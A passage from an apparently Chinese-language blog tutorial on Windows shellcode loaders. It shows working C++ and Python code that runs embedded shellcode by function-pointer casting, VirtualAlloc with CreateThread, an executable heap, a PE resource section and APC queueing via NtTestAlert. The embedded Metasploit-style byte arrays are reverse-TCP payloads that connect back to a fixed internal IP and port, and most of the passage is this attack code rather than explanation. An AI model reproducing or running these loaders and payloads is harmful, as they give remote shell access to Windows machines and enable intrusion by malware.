class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">	((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; buf)();  <span class="comment">//执行ShellCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-创建线程加载"><a href="#3-创建线程加载" class="headerlink" title="3.创建线程加载"></a>3.创建线程加载</h1><p>上述两种方法都需要将data节的内存设置成可读可写可执行,  以下这段代码的主要作用是在内存中分配一段可执行的内存空间，将buf数组中的内容复制到该内存空间，并创建一个新线程来执行这段内存中的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 申请一块可进行读写操作的内存</span></span><br><span class="line">    LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buf数组中的内容复制到刚刚分配的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的线程来执行内存中的代码</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新创建的线程执行完成</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下述是申请内存加载的python版本代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用MSF生成的python格式的ShellCode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x56\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x4d&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bytearray()函数返回一个新字节数组</span></span><br><span class="line">shellcode= <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#VirtualAlloc函数用来开辟内存空间,返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span><br><span class="line">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#RtlMoveMemory函数将Shellcode加载至此段内存空间</span></span><br><span class="line">buf= (ctypes.c_char *<span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   buf,</span><br><span class="line">   ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用CreateThread函数创建一个线程从Shellcode的起始地址开始执行此段内存空间的内容</span></span><br><span class="line">handle= ctypes.windll.kernel32.CreateThread(</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">   ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过WaitForSingleObject函数来等待执行结束</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>



<h1 id="4-通过堆加载"><a href="#4-通过堆加载" class="headerlink" title="4.通过堆加载"></a>4.通过堆加载</h1><p>这段代码首先创建了一个具有执行权限的堆，然后在堆中分配内存并将shellcode复制到内存中。最后，代码通过直接调用存储在内存中的shellcode来执行它</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 shellcode（恶意代码）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆，以存储shellcode</span></span><br><span class="line">    HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span></span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到buffer指向的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面是另一种创建线程的方法，这里被注释掉了</span></span><br><span class="line">    <span class="comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span></span><br><span class="line">    <span class="comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新线程执行完毕</span></span><br><span class="line">    <span class="comment">// WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="5-基于资源节加载"><a href="#5-基于资源节加载" class="headerlink" title="5.基于资源节加载"></a>5.基于资源节加载</h1><h2 id="导入资源"><a href="#导入资源" class="headerlink" title="导入资源"></a>导入资源</h2><p>使用MSF生成bin文件，随后点击<code>添加资源-&gt;导入</code>，并选择生成的bin文件</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230419150951949.png" alt="image-20230419150951949">	</p>
<p>然后自定义bin文件的资源类型, 此处我自定义的类型为”shellcode”，当然你也可以定义成其它的名字</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230419151102352.png" alt="image-20230419151102352">	</p>
<p>添加完资源后会在当前项目生成一个<code>resource.h</code>, 代码如下所示，这里只需注意这段代码<code>#define IDR_SHELLCODE1 101</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;&#123;NO_DEPENDENCIES&#125;&#125;</span></span><br><span class="line"><span class="comment">// Microsoft Visual C++ 生成的包含文件。</span></span><br><span class="line"><span class="comment">// 供 Shellcode加载器.rc 使用</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//IDR_SHELLCODE1 通常用于标识和引用项目中的某个资源，例如嵌入到可执行文件中的二进制数据、图像或其他类型的资源，在项目的其他部分（例如代码或资源脚本中），可以通过使用 IDR_SHELLCODE1 符号来引用这个资源，而不是直接使用数字常量（如 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDR_SHELLCODE1                  101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Next default values for new objects</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> APSTUDIO_INVOKED</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> APSTUDIO_READONLY_SYMBOLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_RESOURCE_VALUE        102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_COMMAND_VALUE         40001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_CONTROL_VALUE         1001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _APS_NEXT_SYMED_VALUE           101</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>以下是完整shellcode加载器代码: </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过资源加载ShellCode</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ResourceLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:</span></span><br><span class="line"><span class="comment">    HRSRC FindResource(</span></span><br><span class="line"><span class="comment">          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源</span></span><br><span class="line"><span class="comment">          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符</span></span><br><span class="line"><span class="comment">          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    如果查找成功，则返回资源句柄；否则返回NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HRSRC Res = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="string">L&quot;shellcode&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用于获取资源的大小</span></span><br><span class="line">    DWORD ResSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span></span><br><span class="line">    HGLOBAL Load = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, Load, ResSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ResourceLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	</p>
<h1 id="6-基于APC注入"><a href="#6-基于APC注入" class="headerlink" title="6.基于APC注入"></a>6.基于APC注入</h1><h2 id="什么是APC队列"><a href="#什么是APC队列" class="headerlink" title="什么是APC队列"></a>什么是APC队列</h2><p>异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I&#x2F;O 操作。</p>
<p>APC 队列包含两种类型的 APC：</p>
<ol>
<li>内核模式 APC：由内核代码发起，通常用于处理内核级别的异步操作，如异步 I&#x2F;O 完成。</li>
<li>用户模式 APC：由用户代码发起，允许用户态应用程序将特定函数插入到线程的 APC 队列中，以便在线程上下文中异步执行</li>
</ol>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><ul>
<li>使用 <code>VirtualProtect</code> 函数修改 <code>shellcode</code> 所在内存区域的保护属性，将其设置为可执行、可读、可写（<code>PAGE_EXECUTE_READWRITE</code>），以便执行其中的代码。</li>
<li>获取 <code>NtTestAlert</code> 函数的地址。这是一个内部函数，无法直接通过函数名调用。<code>NtTestAlert</code> 函数用于检查当前线程的 APC 队列。如果队列中有挂起的用户模式 APC 请求，<code>NtTestAlert</code> 将触发它们的执行。</li>
<li>使用 <code>QueueUserAPC</code> 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务。这将在 <code>NtTestAlert</code> 被调用时执行 Shellcode。</li>
<li>调用 <code>NtTestAlert</code> 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行</li>
</ul>
<h2 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h2><p>该代码通过在当前线程的 APC 队列中添加一个执行 Shellcode 的任务，并调用 <code>NtTestAlert</code> 函数触发 APC 队列中的任务执行，从而实现了加载并执行 Shellcode 的目的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7&quot;</span></span><br><span class="line"><span class="string">&quot;\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f\x9b\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span 